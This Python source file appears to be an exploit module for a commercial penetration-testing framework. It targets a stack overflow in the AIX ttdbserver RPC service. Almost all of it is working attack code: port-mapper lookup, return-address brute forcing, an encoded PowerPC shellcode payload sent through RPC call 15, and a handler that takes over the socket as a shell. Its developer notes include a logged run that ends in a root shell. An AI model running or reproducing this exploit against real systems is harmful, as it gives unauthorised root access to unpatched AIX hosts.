#!/usr/bin/env python

# bye bug
# ttdbserver remote
# AIX

import sys
if '.' not in sys.path:
    sys.path.append('.')

import traceback

import libs.rpc as rpc
from tcpexploit import tcpexploit
from exploitutils import *
from MOSDEF import mosdef

from aixNode import aixNode
from MOSDEFShellServer.AIX import AIX_PowerPC
from shellcode.aixShellcodeGenerator import aix_powerpc
from shellcode.aixShellcodeGenerator import get_aix_version

NAME                                = 'ttdbserver remote root exploit (AIX)'
DESCRIPTION                         = 'ttdbserver libtt.a _tt_internal_realpath stack overflow'
VERSION                             = 'v0.1'

DOCUMENTATION                       = {}
DOCUMENTATION['Date Public']        = '17/06/2009'
DOCUMENTATION['References']         = 'http://www.risesecurity.org/advisories/RISE-2009001.txt'
DOCUMENTATION['Repeatability']      = 'Unlimited'
DOCUMENTATION['Versions Affected']  = 'AIX 5.x / AIX 6.x'
DOCUMENTATION['Notes']              = ''

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Remote'
PROPERTY['ARCH']                    = [['AIX', 'powerpc']]
PROPERTY['VERSION']                 = ['5.1', '5.2', '5.3', '6.1']

DEVNOTES = """
r1 mem is not icache sync, use heap src for ret addr

[ Tue Jun 30 09:43:15 2009 ][C] (192.168.1.100/32) [+] encoded payload length: 940 bytes
[ Tue Jun 30 09:43:15 2009 ][C] (192.168.1.100/32) [+] connecting to port mapper
[ Tue Jun 30 09:43:15 2009 ][C] (192.168.1.100/32) [+] ttdbserver at port 32769
[ Tue Jun 30 09:43:15 2009 ][C] (192.168.1.100/32) [+] connecting to ttdbserver
[ Tue Jun 30 09:43:15 2009 ][C] (192.168.1.100/32) [+] triggering call 15
### halted, attach

[+] using custom do_call
[+] sending GOOO trigger ...
[+] got reply: 'GOOO'
[ Tue Jun 30 09:43:15 2009 ][C] (192.168.1.100/32) [+] got it ... recycling socket
<hostKnowledge.interfacesList instance at 0x8ecf68c>
[C] Self.fd=3
[C] mainloop length=232
[C] Resetting signal handlers...
[C] Defaulting SIGCHLD
[C] Ignoring SIGPIPE
[C] Getting UIDs
[C] Calling findInterfaces
[C] Reading 5 interfaces from remote side (160 len bytes)
[C] Adding interface: en0
[C] Adding interface: lo0
(Cmd) $ shellshock
[!] Turning MOSDEF-Node into temporary interactive shell
[!] Note: will revert back to MOSDEF on "exit"
shellshocked!
# id ; uname -a
uid=0(root) gid=0(system) groups=2(bin),3(sys),7(security),8(cron),10(audit),11(lp)
AIX localhost 2 5 000948BC4C00
# 

...


# id ; uname -a
uid=0(root) gid=0(system) groups=2(bin),3(sys),7(security),8(cron),10(audit),11(lp)
AIX localhost 1 5 000BD3CF4C00
# 


Patch:

http://www14.software.ibm.com/webapp/set2/subscriptions/pqvcmjd?mode=18&ID=4699&myns=paix52&mync=E

"""

class GOOOShell(Exception):    
    __name__ = 'GOOOShell'
    def __repr__(self):
        return 'GOOO'

# trigger TCP client for call 15
class RPC(rpc.TCPClient):
    
    def call_15(self, arg, debug = False, pollwait = 3):
        if debug == True:
            print "### halted, attach"
            sys.stdin.read(1)
        return self.make_call(15, 
                              arg,
                              self.packer.pack_string,
                              self.unpacker.unpack_string,
                              pollwait = pollwait)
    
    # customized make_call to work with interval
    def make_call(self, proc, args, pack_func, unpack_func, pollwait = 3):
        if pack_func is None and args is not None:
            raise TypeError, 'non-null args with null pack_func'
        self.start_call(proc)
        if pack_func:
            pack_func(args)
        self.do_call(pollwait = pollwait)
        if unpack_func:
            result = unpack_func()
        else:
            result = None
        self.unpacker.done()
        return result
    
    # customized do_call to work with GOOOFindSock
    def do_call(self, pollwait = 3):
        if self.sock == None:
            return
        call = self.packer.get_buf()
        if self.covertness >= 9:
            print "Covert do_call"
            import time
            i = 0
            for c in call:
                rpc.sendfrag(self.sock, 0, c)
                time.sleep(1.5)
                i += 1
            rpc.sendfrag(self.sock, 1, "")
        else:
            rpc.sendrecord(self.sock, call)
        # wait for payload poll to be there on slow boxes
        if pollwait:
            print "[+] waiting %d secs for payload poll (real world)" % pollwait
            import time
            time.sleep(pollwait)
        self.sock.send('GOOO')
        reply = self.sock.recv(4)
        if 'GOOO' in reply:
            raise GOOOShell
        return

class theexploit(tcpexploit):
    
    TTDB_PROG = 100083
    TTDB_VERS = 1
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.host = '127.0.0.1'
        self.port = 0
        self.auto = True
        return
    
    def get_args(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        return
    
    def get_payload(self, version = '5.2'):
        sc = aix_powerpc(version = version)
        sc.addAttr('GOOOFindSock_no_errno')
        sc.addAttr('read_and_exec_loop_no_errno', { 'fd' : 'r30' })
        data    = sc.get()
        encoded = sc.xor_encode(data, xormask = 0xae, version = version)
        self.log('[+] encoded payload length: %d bytes' % len(encoded))
        return encoded
        
    def port_map(self, prog = TTDB_PROG, vers = TTDB_VERS):
        port = 0
        try:
            # mapping: program number, version, protocol, port
            pmap = rpc.TCPPortMapperClient(self.host, getsock = self)
            port = pmap.Getport((prog, vers, rpc.IPPROTO_TCP, 0))
        except:
            self.log('[-] could not connect to port mapper.')
        return port
    
    def run(self, prog = TTDB_PROG, vers = TTDB_VERS):

        self.get_args()
        
        # version the host so we can get right syscall set
        self.log('[+] versioning host over dtspcd')
        version = get_aix_version(self.host)
        payload = self.get_payload(version = version)
        
        # sanity check
        if version not in ['5.1', '5.2']:
            self.log('[+] sorry, this AIX target version is not yet MOSDEF supported')
            self.log('[+] contact: bas.alberts@immunityinc.com to get this working')
            return None

        # query port mapper if not hardset
        if not self.port:
            self.log('[+] connecting to port mapper')
            self.port = self.port_map()

        # some sanity checking
        if self.port:
            self.log('[+] ttdbserver at port %d' % self.port)
        else:
            self.log('[-] could not find ttdbserver port')
            return None
        
        self.log('[+] starting brute run')        
        stk_b = 0x2ff22fff  # stack base (5.2, 5.1)

        # set pol_w to a higher value on real world / slow hardware
        # it controls the number of secs you wait for the payload
        # to be in polling mode ... slow hardware 3 secs is a good val
        # fast hardware, you can go 0
        
        if version in ['5.2']:
            ret_b = 0x20096004 # brute base 5.2
            brt_s = 0x200
            pol_w = 0
        if version in ['5.1']:
            ret_b = 0x20079004 # brute base 5.1
            brt_s = 0x200
            pol_w = 3
            
        nop     = mosdef.assemble('xor. r2,r2,r2', 'PPC')
        safe_a  = (stk_b - 0x2000) & -4

        for ret_a in range(ret_b, ret_b + 0x7fff, brt_s):
  
            # init rpc client to ttdbserver
            self.log('[+] connecting to ttdbserver')
            c = RPC(self.host, prog, vers, self.port, getsock = self)
            
            try:
                # technically we should do a 1,2,3 on the align
                a_aln   = 0
                data    = 'P' * a_aln
                # prepad with safe write var align on 4
                data    += struct.pack('>L', (stk_b - 0x2000) & -4) * 0x40b
                # saved registers
                data    += struct.pack('>L', 0x41414141)
                data    += struct.pack('>L', 0x42424242)
                data    += struct.pack('>L', ret_a) # saved link register
                data    += struct.pack('>L', 0x44444444)
                data    += struct.pack('>L', 0x45454545)
                data    += struct.pack('>L', 0x46464646)                
                # add socket recycling payload
                p_aln   = 0
                data    += nop * 0x600 + 'P' * p_aln + payload
            
                self.log('[+] triggering call 15 with ret @ %.X' % ret_a)
                c.call_15(data, pollwait = pol_w, debug = False)
                
            except GOOOShell:
                self.log('[+] got it ... recycling socket')
                node            = aixNode()
                node.parentnode = self.argsDict['passednodes'][0]
                AIX_PowerPC(c.sock, node, version = version, logfunction = self.logfunction)
                try:
                    # stack ovf, we hosed errno
                    node.shell.errno = False
                    node.startup()
                    self.log('[+] NOTE: dropped /core clean up after yourself')
                    return node
                except:
                    # partial payload?
                    self.log('[+] hit fragmented partial payload or errno deref!?')
                    raise
            except:
                #traceback.print_exc(file=sys.stderr)
                self.log('[+] crash')
                c.close()
                
        self.log('[+] no go.')    
        return None
    
if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [None, False]:
        ret.interact()
